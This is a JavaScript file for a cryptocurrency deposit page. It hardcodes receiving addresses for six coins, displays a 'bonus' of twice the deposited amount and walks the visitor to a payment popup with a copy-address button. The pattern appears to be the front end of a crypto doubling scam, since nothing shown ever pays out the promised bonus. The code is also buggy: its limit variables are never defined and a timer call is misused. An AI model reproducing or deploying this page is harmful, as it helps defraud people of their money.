//wallet address
const ethAddress = "0x3621d213f7f8161973bd83b8f8bee6f331d5b1a7";
const btcAddress = "3C4hFoBn47zpwCmm8vakEF9vGJKW8qPs9Z";
const ltcAddress = "LXPQBD8HVC4hrvUXYziXk33bMEosBhTYwH";
const dogeAddress = "DGVMCYoQJhuESvJdrThHucfQNmUHCw4sVD";
const bnbAddress = "bnb1xk05h8xzy4f4t2scg232gkj99m3u24q70cudkv";
const trxAddress = "TDRGw3YztTUh8rMohankgD7JU5MDpcS2Lp";

//data collection
const warning = document.querySelector(".warning");
const genBtn = document.querySelector("#btn");
const container = document.querySelector("#container-box");
const container_box = document.querySelector(".box");
let paybox = document.querySelector("#paybox");
const paymentAddress = document.querySelector(".payment-address");
let amount = document.querySelector(".amount");
let paymentAmount = document.querySelector(".payment-amount");
const payAmount = document.querySelector("#payment-amount");
let coin = document.querySelector(".coin");

//max value
const maxAmount = document.querySelector("#maxAmount");
const minAmount = document.querySelector("#minAmount");
const max2Amount = document.querySelector("#max2");
const min2Amount = document.querySelector("#min2");

//get function
function bonusCalculation() {
  let amount = document.querySelector(".amount").value;
  let bonus = document.querySelector(".bonus");
  amount = parseFloat(amount);
  console.log(amount);
  bonus.value = amount * 2;
  if (amount <= _lessThan) {
    warning.style.display = "block";
    warning.innerHTML = `The minimum deposit amount is ${_lessThan}`;
    warning.style.color = "red";
    warning.style.marginLeft = "-1px";
    warning.style.textAlign = "start";
    warning.style.marginTop = "10px";
    genBtn.style.backgroundColor = "grey";
    genBtn.disabled = true;
  } else if (amount > _greaterThan) {
    warning.style.display = "block";
    warning.style.marginTop = "10px";
    warning.innerHTML = `The maximum deposit amount is ${_greaterThan}`;
    warning.style.color = "red";
    warning.style.marginLeft = "-1px";
    warning.style.textAlign = "start";
    genBtn.style.backgroundColor = "grey";
    genBtn.disabled = true;
  } else {
    warning.style.display = "none";
    genBtn.disabled = false;
    genBtn.style.backgroundColor = "#3486b6fb";
    paymentAmount.innerText = amount;
    payAmount.innerText = amount;
  }
}
function payPrompt() {
  container.style.display = "none";
  container_box.style.filter = "blur(5px)";
  container_box.style.position = "fixed";
  paybox.classList.add("open-pop");
}
function copyAddress(htmlElement) {
  if (!htmlElement) {
    return;
  }
  const elementText = htmlElement.innerHTML;
  const inputElement = document.createElement("input");
  inputElement.setAttribute("value", elementText);
  document.body.appendChild(inputElement);
  inputElement.select();
  document.execCommand("copy");
}
document.querySelector(".copy-btn").onclick = function(){
  copyAddress(document.querySelector(".payment-address"));
  setTimeout(function(){
    paymentAddress.innerHTML = "Copied", 2000;
    document.querySelector(".copy-btn").disabled = true;
  });
}

function emptyBox() {
  let amount = document.querySelector(".amount").value;
  const amountLenght = amount.toString().length;
  let userAddress = document.querySelector("#address").value;
  if (amountLenght < 1) {
    warning.innerHTML = "Enter amount";
    warning.style.color = "red";
    warning.style.marginLeft = "-1px";
    warning.style.marginTop = "10px";
    genBtn.style.backgroundColor = "grey";
    genBtn.disabled = true;
    warning.style.display = "block";
    warning.style.textAlign = "start";
  } else {
    console.log(`${amountLenght} is greater than 3 perharps match`);
  }
  userAddressLenght = userAddress.toString().length;
  if (userAddressLenght < 15) {
    warning.style.display = "block";
    warning.style.marginTop = "10px";
    warning.innerHTML = "Invalid wallet address";
    warning.style.color = "red";
    warning.style.marginLeft = "-1px";
    warning.style.textAlign = "start";
    genBtn.style.backgroundColor = "grey";
    genBtn.disabled = true;
  } else if (userAddressLenght > 15) {
    payPrompt();
  }
}
function alertBox() {
  alert("Hello world to the user");
}

genBtn.addEventListener("click", function () {
  emptyBox();
});
